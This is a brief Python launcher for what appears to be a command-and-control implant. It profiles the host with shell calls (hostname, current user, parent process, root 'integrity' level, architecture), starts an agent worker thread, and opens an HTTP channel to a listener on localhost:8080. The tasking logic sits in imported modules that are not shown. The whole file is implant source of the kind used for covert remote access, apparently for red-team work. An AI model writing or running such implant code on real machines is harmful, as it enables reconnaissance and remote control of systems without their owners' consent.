import os
import random
import threading

from Models.Agent import Agent
from Modules.httpcomm import HTTPCommunicationModule

def generateMetadata() -> dict:
        return {
            "id": random.randint(1000, 9999),
            "hostname": os.popen("hostname").read().strip(),
            "username": os.popen("whoami").read().strip(),
            "processname": os.popen("basename $(ps -o comm= -p $PPID)").read().strip(),
            "pid": os.getpid(),
            "integrity": "high" if os.popen("whoami").read().strip() == "root" else "low",
            "arch": os.popen("uname -m").read().strip()
        }

if __name__ == '__main__':
    agent = Agent(generateMetadata())
    
    agent_worker = threading.Thread(target=agent.Work)
    agent_worker.start()

    com_module = HTTPCommunicationModule("localhost", 8080)
    com_module.config(agent)
    com_module.start()